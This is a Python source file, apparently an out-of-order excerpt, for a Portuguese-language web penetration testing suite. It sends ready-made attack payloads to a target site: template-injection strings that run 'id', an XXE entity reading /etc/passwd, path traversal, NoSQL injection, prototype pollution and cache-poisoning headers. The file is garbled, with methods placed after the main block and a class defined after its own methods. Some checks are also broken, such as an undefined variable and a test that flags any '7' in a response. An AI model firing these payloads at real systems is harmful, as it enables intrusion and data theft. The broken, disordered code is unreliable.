    ║   ██████╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗      ║
    ║  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝      ║
    ║  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝███████╗      ║
    ║  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗╚════██║      ║
    ║  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║███████║      ║
    ║   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝      ║
    ║                                                          ║
    ║                Web Penetration Testing Suite             ║
    ║                   v3.0 - Professional                    ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    {Style.RESET_ALL}""")

def print_menu():
    """Exibe menu da ferramenta"""
    print(f"\n{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🏴󠁧󠁢󠁥󠁮󠁧󠁿 MENU PRINCIPAL - CYBERFORCE PENTEST SUITE{Style.RESET_ALL}")
    print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}1.{Style.RESET_ALL} Reconhecimento Avançado")
    print(f"{Fore.YELLOW}2.{Style.RESET_ALL} Scanner de Vulnerabilidades")
    print(f"{Fore.YELLOW}3.{Style.RESET_ALL} Enumeração de Diretórios")
    print(f"{Fore.YELLOW}4.{Style.RESET_ALL} Teste Completo (Recon + Vuln)")
    print(f"{Fore.YELLOW}5.{Style.RESET_ALL} Scan Personalizado")
    print(f"{Fore.YELLOW}6.{Style.RESET_ALL} Gerar Relatório")
    print(f"{Fore.YELLOW}7.{Style.RESET_ALL} Exportar Vulnerabilidades (CSV)")
    print(f"{Fore.YELLOW}8.{Style.RESET_ALL} Enviar Relatório por Email (SMTP)")
    print(f"{Fore.YELLOW}9.{Style.RESET_ALL} Consultar Shodan (se chave presente)")
    print(f"{Fore.YELLOW}10.{Style.RESET_ALL} Autenticação via Formulário")
    print(f"{Fore.YELLOW}11.{Style.RESET_ALL} Deep Fuzz (Parâmetros)")
    print(f"{Fore.YELLOW}12.{Style.RESET_ALL} SSTI Check")
    print(f"{Fore.YELLOW}13.{Style.RESET_ALL} JWT Checks")
    print(f"{Fore.YELLOW}14.{Style.RESET_ALL} JS Render Crawl (Playwright)")
    print(f"{Fore.YELLOW}15.{Style.RESET_ALL} GraphQL Introspection")
    print(f"{Fore.YELLOW}16.{Style.RESET_ALL} Backup Files Finder")
    print(f"{Fore.YELLOW}17.{Style.RESET_ALL} Cloud Services Detector")
    print(f"{Fore.YELLOW}18.{Style.RESET_ALL} Source Maps Analyzer")
    print(f"{Fore.YELLOW}19.{Style.RESET_ALL} Comments Harvester")
    print(f"{Fore.YELLOW}20.{Style.RESET_ALL} XXE Injection Check")
    print(f"{Fore.YELLOW}21.{Style.RESET_ALL} Prototype Pollution Test")
    print(f"{Fore.YELLOW}22.{Style.RESET_ALL} API Endpoints Mapper")
    print(f"{Fore.YELLOW}23.{Style.RESET_ALL} Security.txt Checker")
    print(f"{Fore.YELLOW}0.{Style.RESET_ALL} Sair")
    print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}")

def main():
    """Função principal"""
    banner()
    
    # Disclaimer legal
    print(f"\n{Fore.RED}{Style.BRIGHT}⚠ AVISO LEGAL IMPORTANTE ⚠{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Esta ferramenta é fornecida apenas para fins educacionais e de teste ético.")
    print("Você deve possuir autorização EXPLÍCITA por escrito para testar qualquer sistema.")
    print("Uso não autorizado é ilegal e pode resultar em ação penal.{Style.RESET_ALL}")
    
    confirm = input(f"\n{Fore.RED}[?] Você aceita os termos e possui autorização? (s/n): {Style.RESET_ALL}")
    if confirm.lower() != 's':
        print(f"{Fore.RED}[!] Abortando. Obtenha autorização primeiro.{Style.RESET_ALL}")
        sys.exit(1)
    
    # Solicita URL alvo
    target_url = input(f"\n{Fore.CYAN}[?] Digite a URL alvo (ex: https://example.com): {Style.RESET_ALL}").strip()
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    # Configurações
    output_dir = input(f"[?] Diretório de saída (padrão: pentest_reports): ").strip() or "pentest_reports"
    
    # Inicializa suite
    print(f"\n{Fore.GREEN}[*] Inicializando CyberForce Pentest Suite...{Style.RESET_ALL}")
    suite = AdvancedWebPentestSuite(target_url, output_dir)
    
    while True:
        print_menu()
        choice = input(f"\n{Fore.CYAN}[?] Escolha uma opção (0-6): {Style.RESET_ALL}").strip()
        
        if choice == '1':
            print(f"\n{Fore.YELLOW}[*] Executando Reconhecimento Avançado...{Style.RESET_ALL}")
            suite.advanced_reconnaissance()
            
        elif choice == '2':
            print(f"\n{Fore.YELLOW}[*] Executando Scanner de Vulnerabilidades...{Style.RESET_ALL}")
            vulnerabilities = suite.vulnerability_scan()
            if vulnerabilities:
                print(f"{Fore.GREEN}[+] Scan concluído: {len(vulnerabilities)} vulnerabilidades encontradas{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}[!] Nenhuma vulnerabilidade encontrada{Style.RESET_ALL}")
                
        elif choice == '3':
            print(f"\n{Fore.YELLOW}[*] Enumerando Diretórios...{Style.RESET_ALL}")
            results = suite.directory_enumeration()
            if results:
                print(f"{Fore.GREEN}[+] Enumeração concluída: {len(results.get('directories', []))} diretórios, {len(results.get('files', []))} arquivos{Style.RESET_ALL}")
                
        elif choice == '4':
            print(f"\n{Fore.YELLOW}[*] Executando Teste Completo...{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Fase 1: Reconhecimento{Style.RESET_ALL}")
            suite.advanced_reconnaissance()
            print(f"{Fore.CYAN}[*] Fase 2: Scanner de Vulnerabilidades{Style.RESET_ALL}")
            suite.vulnerability_scan()
            print(f"{Fore.GREEN}[+] Teste completo concluído!{Style.RESET_ALL}")
            
        elif choice == '5':
            print(f"\n{Fore.CYAN}[*] Configurando Scan Personalizado{Style.RESET_ALL}")
            print("Selecione os módulos para executar:")
            
            if input("  Executar Reconhecimento? (s/n): ").lower() == 's':
                print(f"{Fore.YELLOW}[*] Executando Reconhecimento...{Style.RESET_ALL}")
                suite.advanced_reconnaissance()
            
            if input("  Executar Scanner de Vulnerabilidades? (s/n): ").lower() == 's':
                print(f"{Fore.YELLOW}[*] Executando Scanner de Vulnerabilidades...{Style.RESET_ALL}")
                suite.vulnerability_scan()
            
            if input("  Executar Enumeração de Diretórios? (s/n): ").lower() == 's':
                print(f"{Fore.YELLOW}[*] Executando Enumeração de Diretórios...{Style.RESET_ALL}")
                suite.directory_enumeration()
            
        elif choice == '6':
            print(f"\n{Fore.YELLOW}[*] Gerando Relatório Completo...{Style.RESET_ALL}")
            report_path = suite.generate_comprehensive_report()
            print(f"{Fore.GREEN}[+] Relatório gerado: {report_path}{Style.RESET_ALL}")
            
        elif choice == '7':
            print(f"\n{Fore.YELLOW}[*] Exportando vulnerabilidades para CSV...{Style.RESET_ALL}")
            csv_path = suite.export_vulns_csv()
            print(f"{Fore.GREEN}[+] CSV gerado: {csv_path}{Style.RESET_ALL}")

        elif choice == '8':
            print(f"\n{Fore.YELLOW}[*] Enviando relatório por email...{Style.RESET_ALL}")
            smtp_server = input('SMTP server (ex: smtp.gmail.com): ').strip()
            smtp_port = int(input('SMTP port (ex: 587): ').strip() or 587)
            username = input('Username: ').strip()
            password = input('Password: ').strip()
            from_addr = input('From (email): ').strip()
            to_addrs = input('To (comma-separated emails): ').strip().split(',')
            subject = input('Subject (opcional): ').strip() or None
            suite.send_report_via_email(smtp_server, smtp_port, username, password, from_addr, to_addrs, subject)

        elif choice == '9':
            print(f"\n{Fore.YELLOW}[*] Consultando Shodan...{Style.RESET_ALL}")
            suite.shodan_lookup()

        elif choice == '10':
            print(f"\n{Fore.YELLOW}[*] Autenticação via formulário...{Style.RESET_ALL}")
            login_url = input('Login URL: ').strip()
            username_field = input('Campo usuário (name): ').strip()
            password_field = input('Campo senha (name): ').strip()
            username = input('Username: ').strip()
            password = input('Password: ').strip()
            suite.authenticate_via_form(login_url, username_field, password_field, username, password)

        elif choice == '11':
            print(f"\n{Fore.YELLOW}[*] Executando Deep Fuzz (parâmetros)...{Style.RESET_ALL}")
            max_tests = int(input('Máximo de testes (padrão 1000): ').strip() or 1000)
            suite.fuzz_parameters(max_tests=max_tests)

        elif choice == '12':
            print(f"\n{Fore.YELLOW}[*] Executando SSTI Check...{Style.RESET_ALL}")
            suite.check_ssti()

        elif choice == '13':
            print(f"\n{Fore.YELLOW}[*] Executando JWT Checks...{Style.RESET_ALL}")
            suite.check_jwt_tokens()

        elif choice == '14':
            print(f"\n{Fore.YELLOW}[*] Executando JS Render Crawl (Playwright)...{Style.RESET_ALL}")
            suite.js_render_crawl()

        elif choice == '15':
            print(f"\n{Fore.YELLOW}[*] Executando GraphQL Introspection...{Style.RESET_ALL}")
            suite.check_graphql()

        elif choice == '16':
            print(f"\n{Fore.YELLOW}[*] Procurando Arquivos de Backup...{Style.RESET_ALL}")
            suite.find_backup_files()

        elif choice == '17':
            print(f"\n{Fore.YELLOW}[*] Detectando Serviços Cloud...{Style.RESET_ALL}")
            suite.detect_cloud_services()

        elif choice == '18':
            print(f"\n{Fore.YELLOW}[*] Analisando Source Maps...{Style.RESET_ALL}")
            suite.analyze_source_maps()

        elif choice == '19':
            print(f"\n{Fore.YELLOW}[*] Colhendo Comentários Sensíveis...{Style.RESET_ALL}")
            suite.harvest_comments()

        elif choice == '20':
            print(f"\n{Fore.YELLOW}[*] Testando XXE Injection...{Style.RESET_ALL}")
            suite.check_xxe()

        elif choice == '21':
            print(f"\n{Fore.YELLOW}[*] Testando Prototype Pollution...{Style.RESET_ALL}")
            suite.check_prototype_pollution()

        elif choice == '22':
            print(f"\n{Fore.YELLOW}[*] Mapeando Endpoints de API...{Style.RESET_ALL}")
            suite.find_api_endpoints()

        elif choice == '23':
            print(f"\n{Fore.YELLOW}[*] Verificando security.txt...{Style.RESET_ALL}")
            suite.check_security_txt()

        elif choice == '0':
            print(f"\n{Fore.CYAN}[*] Encerrando CyberForce Pentest Suite...{Style.RESET_ALL}")
            break
            
        else:
            print(f"{Fore.RED}[!] Opção inválida{Style.RESET_ALL}")
        
        input(f"\n{Fore.CYAN}[?] Pressione Enter para continuar...{Style.RESET_ALL}")
    
    print(f"{Fore.GREEN}[+] Scan finalizado. Verifique os relatórios em {suite.output_dir}/{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan interrompido pelo usuário.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Erro crítico: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
    def check_ssti(self):
        """Testa Server-Side Template Injection (SSTI) em formulários e parâmetros"""
        ssti_payloads = [
            '{{7*7}}', '{%7*7%}', '${7*7}', '#{7*7}', '<%= 7*7 %>',
            '{{config.items()}}', '{% for c in config.items() %}{{ c }}{% endfor %}',
            '${T(java.lang.Runtime).getRuntime().exec("id")}', '<%= system("id") %>'
        ]
        
        forms = self.extract_all_forms()
        for form in forms:
            for payload in ssti_payloads:
                try:
                    data = {}
                    for inp in form['inputs']:
                        name = inp.get('name')
                        if not name:
                            continue
                        data[name] = payload
                    
                    if form['method'].upper() == 'POST':
                        r = self.session.post(form['action'], data=data, timeout=7, verify=False)
                    else:
                        r = self.session.get(form['action'], params=data, timeout=7, verify=False)
                    
                    if '49' in r.text or '7' in r.text:  # Resultado de 7*7
                        self.add_vulnerability({'type': 'SSTI Detected', 'severity': 'CRITICAL', 'url': form['action'], 'evidence': f'SSTI payload executado: {payload}', 'response_text': r.text})
                        print(f"{Fore.RED}[!] SSTI CRÍTICO ENCONTRADO{Style.RESET_ALL}")
                except Exception as e:
                    self.logger.debug(f"Erro ao testar SSTI: {e}")
        
        print(f"{Fore.GREEN}[+] SSTI checks concluídos{Style.RESET_ALL}")
        # Testa em parâmetros GET
        test_url = f"{self.target_url}?name={{7*7}}"
        try:
            r = self.session.get(test_url, timeout=7, verify=False)
            if '49' in r.text or '7' in r.text:
                self.add_vulnerability({'type': 'SSTI Detected', 'severity': 'CRITICAL', 'url': test_url, 'evidence': 'SSTI payload executado em parâmetro GET', 'response_text': r.text})
                print(f"{Fore.RED}[!] SSTI CRÍTICO ENCONTRADO em parâmetro GET{Style.RESET_ALL}")
        except Exception as e:
            self.logger.debug(f"Erro ao testar SSTI em parâmetro GET: {e}")
        return True
    def check_graphql(self):
        """Verifica se GraphQL está habilitado e tenta introspection"""
        graphql_endpoints = [
            '/graphql', '/api/graphql', '/v1/graphql', '/v2/graphql',
            '/graphql/', '/api/v1/graphql', '/api/v2/graphql'
        ]
        
        found = []
        for endpoint in graphql_endpoints:
            test_url = urljoin(self.target_url, endpoint)
            try:
                r = self.session.post(test_url, json={"query": "{ __schema { types { name } } }"}, timeout=7, verify=False)
                if 'data' in r.text and '__schema' in r.text:
                    found.append(test_url)
                    print(f"{Fore.YELLOW}[!] GraphQL Introspection habilitado em: {test_url}{Style.RESET_ALL}")
                    self.add_vulnerability({'type': 'GraphQL Introspection Enabled', 'severity': 'MEDIUM', 'url': test_url, 'evidence': 'Introspection query retornou dados', 'response_text': r.text[:500]})
            except Exception as e:
                self.logger.debug(f"Erro ao testar GraphQL em {test_url}: {e}")
        if found:
            self.save_list(found, 'graphql_endpoints.txt')
        print(f"{Fore.GREEN}[+] GraphQL check concluído ({len(found)} encontrados){Style.RESET_ALL}")
        return found
class AdvancedWebPentestSuite(WebPentestSuite):
    """Extensão avançada da suíte de pentest web com novos módulos"""
    
    def find_backup_files(self):
        """Procura por arquivos de backup comuns expostos"""
        backup_patterns = [
            '.bak', '.backup', '~', '.zip', '.tar.gz', '.tar', '.gz',
            '.sql', '.db', '.mdb', '.old', '.orig', '.copy', '.dist', '.git',
            '.env.bak', '.env.backup', '.env.local',
            'config.bak', 'config.backup', 'database.bak',
            '.DS_Store', 'thumbs.db', '.vscode',
            'package-lock.json', 'composer.lock', 'requirements.txt'
        ]
        
        found = []
        crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
        urls = []
        if os.path.exists(crawled_file):
            with open(crawled_file, 'r') as f:
                urls = [line.strip() for line in f.readlines()][:100]
        else:
            urls = [self.target_url]
        
        for url in urls:
            for pattern in backup_patterns:
                test_url = url + pattern
                try:
                    r = self.session.head(test_url, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code in [200, 403]:
                        found.append(test_url)
                        self.add_vulnerability({'type': 'Backup/Sensitive File', 'severity': 'HIGH', 'url': test_url, 'evidence': f'Arquivo encontrado: {pattern}', 'status_code': r.status_code})
                        print(f"{Fore.YELLOW}[!] Arquivo encontrado: {test_url}{Style.RESET_ALL}")
                except Exception as e:
                    self.logger.debug(f"Erro ao procurar {test_url}: {e}")
        
        if found:
            self.save_list(found, 'backup_files.txt')
        print(f"{Fore.GREEN}[+] Backup files check concluído ({len(found)} encontrados){Style.RESET_ALL}")
        return found
    def detect_cloud_services(self):
        """Detecta uso de serviços de cloud storage/CDN através de padrões em URLs e respostas"""
        cloud_patterns = {
            'AWS S3': [r's3\.amazonaws\.com', r'\.s3\.amazonaws\.com', r's3-[a-z0-9-]+\.amazonaws\.com', r'\.s3-[a-z0-9-]+\.amazonaws\.com'],
            'Azure Blob Storage': [r'\.blob\.core\.windows\.net'],
            'Azure Queue Storage': [r'\.queue\.core\.windows\.net'],
            'Azure Table Storage': [r'\.table\.core\.windows\.net'],
            'Google Cloud Storage': [r'storage\.googleapis\.com', r'\.storage\.googleapis\.com'],
            'Cloudflare R2': [r'r2\.cloudflarestorage\.com'],
            'DigitalOcean Spaces': [r'\.digitaloceanspaces\.com'],
            'Backblaze B2': [r'\.b2\.backblazeb2\.com'],
            'Wasabi': [r'\.wasabisys\.com'],
            'Alibaba OSS': [r'\.aliyuncs\.com'],
            'IBM Cloud Object Storage': [r'\.cloud-object-storage\.appdomain\.cloud']
        }
        found = {}
        crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
        urls = []
        if os.path.exists(crawled_file):
            with open(crawled_file, 'r') as f:
                urls = [line.strip() for line in f.readlines()][:100]
        else:
            urls = [self.target_url]
        for url in urls:
            try:
                r = self.session.get(url, timeout=7, verify=False)
                for service, patterns in cloud_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, url) or re.search(pattern, r.text):
                            if service not in found:
                                found[service] = []
                            found[service].append(url)
            except Exception:
                continue
        if found:
            self.save_json(found, 'cloud_services.json')
            for service, urls in found.items():
                self.add_vulnerability({'type': 'Cloud Service Detected', 'severity': 'LOW', 'url': self.target_url, 'evidence': f'Serviço: {service}, URLs: {len(urls)}', 'sample_urls': urls[:5]})
        print(f"{Fore.GREEN}[+] Cloud services detection concluído ({len(found)} serviços encontrados){Style.RESET_ALL}")
        return found
    def analyze_source_maps(self):
        """Analisa source maps expostos em arquivos JS/CSS"""
        found = []
        crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
        urls = []
        if os.path.exists(crawled_file):
            with open(crawled_file, 'r') as f:
                urls = [line.strip() for line in f.readlines() if line.strip().endswith(('.js', '.css'))][:100]
        else:
            urls = [self.target_url]
        
        for url in urls:
            try:
                r = self.session.get(
url, timeout=7, verify=False)
                # Procura por referência a source maps
                map_matches = re.findall(r'//# sourceMappingURL=(.+\.map)', r.text)
                for map_file in map_matches:
                    map_url = urljoin(url, map_file)
                    try:
                        mr = self.session.get(map_url, timeout=7, verify=False)
                        if mr.status_code == 200:
                            found.append(map_url)
                            self.add_vulnerability({'type': 'Source Map Exposed', 'severity': 'MEDIUM', 'url': map_url, 'evidence': 'Source map acessível', 'response_text': mr.text[:500]})
                            print(f"{Fore.YELLOW}[!] Source map encontrado: {map_url}{Style.RESET_ALL}")
                    except Exception as e:
                        self.logger.debug(f"Erro ao baixar source map {map_url}: {e}")
            except Exception:
                continue
        if found:
            self.save_list(found, 'source_maps.txt')
        print(f"{Fore.GREEN}[+] Source maps analysis concluído ({len(found)} encontrados){Style.RESET_ALL}")
        return found
    def harvest_comments(self):
        """Colhe comentários de código sensíveis em páginas web"""
        comments_found = {}
        crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
        urls = []
        if os.path.exists(crawled_file):
            with open(crawled_file, 'r') as f:
                urls = [line.strip() for line in f.readlines()][:100]
        else:
            urls = [self.target_url]
        
        sensitive_keywords = ['TODO', 'FIXME', 'NOTE', 'CREDENTIALS', 'PASSWORD', 'SECRET', 'API_KEY', 'TOKEN', 'DEBUG', 'HACK', 'VULNERABILITY', 'BUG', 'TEMP', 'REMOVE', 'DELETE', 'DANGER']
        for url in urls:
            try:
                r = self.session.get(url, timeout=7, verify=False)
                html_comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
                js_comments = re.findall(r'//(.*?)(\n|$)|/\*(.*?)\*/', r.text, re.DOTALL)
                js_comments = [match[0] or match[2] for match in js_comments]
                css_comments = re.findall(r'/\*(.*?)\*/', r.text, re.DOTALL)
                
                all_comments = html_comments + js_comments + css_comments
                sensitive_comments = []
                for comment in all_comments:
                    for keyword in sensitive_keywords:
                        if keyword in comment.upper():
                            sensitive_comments.append(comment.strip())
                            break
                if sensitive_comments:
                    comments_found[url] = sensitive_comments
                    self.add_vulnerability({'type': 'Sensitive Comments Found', 'severity': 'LOW', 'url': url, 'evidence': f'Comentários sensíveis encontrados: {len(sensitive_comments)}', 'sample_comments': sensitive_comments[:3]})
                    print(f"{Fore.YELLOW}[!] Comentários sensíveis encontrados em: {url}{Style.RESET_ALL}")
            except Exception as e:
                self.logger.debug(f"Erro ao colher comentários em {url}: {e}")
        if comments_found:
            self.save_json(comments_found, 'sensitive_comments.json')
        print(f"{Fore.GREEN}[+] Comments harvesting concluído ({len(comments_found)} páginas com comentários sensíveis){Style.RESET_ALL}")
        return comments_found
    def check_xxe(self):
        """Testa XXE Injection em formulários"""
        xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""
        forms = self.extract_all_forms()
        for form in forms:
            try:
                data = {}
                for inp in form['inputs']:
                    name = inp.get('name')
                    if not name:
                        continue
                    data[name] = xxe
                
                if form['method'].upper() == 'POST':
                    r = self.session.post(form['action'], data=data, timeout=7, verify=False)
                else:
                    r = self.session.get(form['action'], params=data, timeout=7, verify=False)
                
                if 'root:x:' in r.text or 'daemon:x:' in r.text:
                    self.add_vulnerability({'type': 'XXE Detected', 'severity': 'CRITICAL', 'url': form['action'], 'evidence': 'Arquivo /etc/passwd lido via XXE', 'response_text': r.text})
                    print(f"{Fore.RED}[!] XXE CRÍTICO ENCONTRADO{Style.RESET_ALL}")
                elif '<!DOCTYPE' in r.text or '&xxe;' in r.text:
                    self.add_vulnerability({'type': 'XXE (Blind)', 'severity': 'HIGH', 'url': form['action'], 'evidence': 'Sistema processou DOCTYPE/ENTITY'})
            except Exception as e:
                self.logger.debug(f"Erro ao testar XXE: {e}")
        
        # Testa em parâmetros GET
        test_url = f"{self.target_url}?data={xxe_payload}"
        try:
            r = self.session.get(test_url, timeout=7, verify=False)
            if 'root:x:' in r.text or 'daemon:x:' in r.text:
                self.add_vulnerability({'type': 'XXE Detected', 'severity': 'CRITICAL', 'url': test_url, 'evidence': '/etc/passwd lido via XXE', 'response_text': r.text})
                print(f"{Fore.RED}[!] XXE CRÍTICO ENCONTRADO em parâmetro GET{Style.RESET_ALL}")
            elif '<!DOCTYPE' in r.text or '&xxe;' in r.text:
                self.add_vulnerability({'type': 'XXE (Blind)', 'severity': 'HIGH', 'url': test_url, 'evidence': 'Sistema processou DOCTYPE/ENTITY'})
        except Exception as e:
            self.logger.debug(f"Erro ao testar XXE em parâmetro GET: {e}")
        return True
    def check_prototype_pollution(self):
        """Testa Prototype Pollution em formulários e parâmetros"""
        pollution_payloads = [
            {'__proto__[isAdmin]': 'true'},
            {'constructor[prototype][isAdmin]': 'true'},
            {'__proto__[role]': 'admin'},
            {'constructor[prototype][role]': 'admin'}
        ]
        
        forms = self.extract_all_forms()
        for form in forms:
            for payload in pollution_payloads:
                try:
                    data = {}
                    for inp in form['inputs']:
                        name = inp.get('name')
                        if not name:
                            continue
                        data[name] = 'test'
                    data.update(payload)
                    
                    if form['method'].upper() == 'POST':
                        r = self.session.post(form['action'], data=data, timeout=7, verify=False)
                    else:
                        r = self.session.get(form['action'], params=data, timeout=7, verify=False)
                    if 'isAdmin' in r.text or 'role' in r.text:
                        self.add_vulnerability({'type': 'Prototype Pollution Detected', 'severity': 'HIGH', 'url': form['action'], 'evidence': f'Payload executado: {payload}', 'response_text': r.text})
                        print(f"{Fore.RED}[!] Prototype Pollution ENCONTRADO{Style.RESET_ALL}")
                except Exception as e:
                    self.logger.debug(f"Erro ao testar Prototype Pollution: {e}")
        
        print(f"{Fore.GREEN}[+] Prototype Pollution check concluído{Style.RESET_ALL}")
        return True

    def check_nosql_injection(self):
        """Testa NoSQL Injection (MongoDB, etc)"""
        payloads = [
            {"$ne": ""},
            {"$gt": ""},
            {"$where": "1==1"},
            {"$regex": ".*"},
            "' || '1'=='1",
            "db.users.find({$where:'this.password==\"pass\"'})"
        ]
        
        forms = self.extract_all_forms()
        for form in forms:
            for payload in payloads:
                try:
                    data = {}
                    for inp in form['inputs']:
                        name = inp.get('name')
                        if not name:
                            continue
                        data[name] = json.dumps(payload) if isinstance(payload, dict) else str(payload)
                    
                    headers = {'Content-Type': 'application/json'}
                    if form['method'].upper() == 'POST':
                        r = self.session.post(form['action'], data=json.dumps(data), headers=headers, timeout=7, verify=False)
                    else:
                        r = self.session.get(form['action'], params=data, timeout=7, verify=False)
                    
                    if 'error' in r.text.lower() or '$where' in r.text or 'mongo' in r.text.lower():
                        self.add_vulnerability({'type': 'NoSQL Injection', 'severity': 'HIGH', 'url': form['action'], 'payload': str(payload), 'evidence': 'Resposta contém indicadores de processamento NoSQL'})
                except Exception as e:
                    self.logger.debug(f"Erro ao testar NoSQL injection: {e}")
        
        print(f"{Fore.GREEN}[+] NoSQL Injection check concluído{Style.RESET_ALL}")
        return True

    def check_deserialization(self):
        """Detecta insecure deserialization"""
        urls = []
        crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
        if os.path.exists(crawled_file):
            with open(crawled_file, 'r') as f:
                urls = [line.strip() for line in f.readlines()][:50]
        else:
            urls = [self.target_url]
        
        for url in urls:
            try:
                r = self.session.get(url, timeout=7, verify=False)
                serialization_patterns = [
                    r'java\.io\.Serializable',
                    r'O:[\d]+:"',
                    r'pickle\.loads',
                    r'Marshal\.load',
                    r'__reduce__',
                    r'__getstate__',
                    r'__setstate__',
                ]
                
                for pattern in serialization_patterns:
                    if re.search(pattern, r.text, re.IGNORECASE):
                        self.add_vulnerability({'type': 'Potential Insecure Deserialization', 'severity': 'HIGH', 'url': url, 'evidence': f'Padrão encontrado: {pattern}'})
                        print(f"{Fore.YELLOW}[!] Deserialization pattern encontrado{Style.RESET_ALL}")
            except Exception:
                continue
        
        print(f"{Fore.GREEN}[+] Deserialization check concluído{Style.RESET_ALL}")
        return True

    def check_path_traversal(self):
        """Testa Path Traversal em parâmetros comuns"""
        payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        ]
        
        test_params = ['file', 'path', 'dir', 'include', 'load', 'page', 'view']
        
        for param in test_params:
            for payload in payloads:
                test_url = f"{self.target_url}?{param}={quote(payload)}"
                try:
                    r = self.session.get(test_url, timeout=5, verify=False)
                    if any(x in r.text for x in ['root:', 'daemon:', 'bin:', '[extensions]']):
                        self.add_vulnerability({'type': 'Path Traversal', 'severity': 'HIGH', 'url': test_url, 'payload': payload, 'evidence': 'Arquivo sensível exposto'})
                        print(f"{Fore.RED}[!] PATH TRAVERSAL ENCONTRADO{Style.RESET_ALL}")
                except Exception:
                    continue
        
        print(f"{Fore.GREEN}[+] Path Traversal check concluído{Style.RESET_ALL}")
        return True

    def check_cache_poisoning(self):
        """Testa Web Cache Poisoning"""
        cache_headers = ['X-Forwarded-Host', 'X-Forwarded-Proto', 'X-Original-URL', 'X-Rewrite-URL']
        
        for header in cache_headers:
            test_headers = {header: 'attacker.com'}
            try:
                r = self.session.get(self.target_url, headers=test_headers, timeout=5, verify=False)
                if 'attacker.com' in r.text and 'attacker.com' not in self.target_url:
                    self.add_vulnerability({'type': 'Web Cache Poisoning', 'severity': 'MEDIUM', 'url': self.target_url, 'evidence': f'Header {header} refletido'})
                    print(f"{Fore.YELLOW}[!] CACHE POISONING{Style.RESET_ALL}")
            except Exception:
                continue
        
        print(f"{Fore.GREEN}[+] Cache Poisoning check concluído{Style.RESET_ALL}")
        return True

    def extract_endpoints_javascript(self):
        """Extrai endpoints de API escondidos em JavaScript"""
        endpoints = set()
        crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
        urls = []
        if os.path.exists(crawled_file):
            with open(crawled_file, 'r') as f:
                urls = [line.strip() for line in f.readlines()][:100]
        else:
            urls = [self.target_url]
        
        patterns = [
            r'fetch\(["\']([^"\']+)',
            r'axios\.(?:get|post|put|delete)\(["\']([^"\']+)',
            r'\.ajax\(\s*\{\s*url\s*:\s*["\']([^"\']+)',
        ]
        
        for url in urls:
            try:
                r = self.session.get(url, timeout=7, verify=False)
                for pattern in patterns:
                    matches = re.findall(pattern, r.text)
                    endpoints.update(matches)
            except Exception:
                continue
        
        resolved_endpoints = set()
        for endpoint in endpoints:
            if endpoint.startswith('/'):
                resolved_endpoints.add(urljoin(self.target_url, endpoint))
            elif endpoint.startswith('http'):
                resolved_endpoints.add(endpoint)
        
        if resolved_endpoints:
            self.save_list(list(resolved_endpoints), 'api_endpoints_from_js.txt')
            print(f"{Fore.GREEN}[+] {len(resolved_endpoints)} endpoints extraídos do JavaScript{Style.RESET_ALL}")
        
        return list(resolved_endpoints)

    def check_java_deserialization(self):
        """Verifica especificamente Java deserialization"""
        java_patterns = [
            'java.io.Serializable',
            'InvokerTransformer',
            'ChainedTransformer',
            'LazyMap',
            'TiedMapEntry',
        ]
        
        urls = []
        crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
        if os.path.exists(crawled_file):
            with open(crawled_file, 'r') as f:
                urls = [line.strip() for line in f.readlines()][:50]
        else:
            urls = [self.target_url]
        
        for url in urls:
            try:
                r = self.session.get(url, timeout=7, verify=False)
                for pattern in java_patterns:
                    if pattern in r.text:
                        self.add_vulnerability({'type': 'Java Deserialization', 'severity': 'CRITICAL', 'url': url, 'evidence': f'Padrão: {pattern}'})
                        print(f"{Fore.RED}[!] JAVA DESERIALIZATION{Style.RESET_ALL}")
            except Exception:
                continue
        
        print(f"{Fore.GREEN}[+] Java deserialization check concluído{Style.RESET_ALL}")
        return True

    def generate_scan_summary(self):
        """Gera sumário executivo do scan"""
        summary = {
            'target': self.target_url,
            'scan_date': datetime.now().isoformat(),
            'total_vulnerabilities': len(self.vulnerabilities),
            'severity_breakdown': {
                'CRITICAL': len([v for v in self.vulnerabilities if v.get('severity') == 'CRITICAL']),
                'HIGH': len([v for v in self.vulnerabilities if v.get('severity') == 'HIGH']),
                'MEDIUM': len([v for v in self.vulnerabilities if v.get('severity') == 'MEDIUM']),
                'LOW': len([v for v in self.vulnerabilities if v.get('severity') == 'LOW']),
            }
        }
        
        for vuln in self.vulnerabilities:
            vuln_type = vuln.get('type', 'Unknown')
            if vuln_type not in summary.get('vulnerability_types', {}):
                if 'vulnerability_types' not in summary:
                    summary['vulnerability_types'] = {}
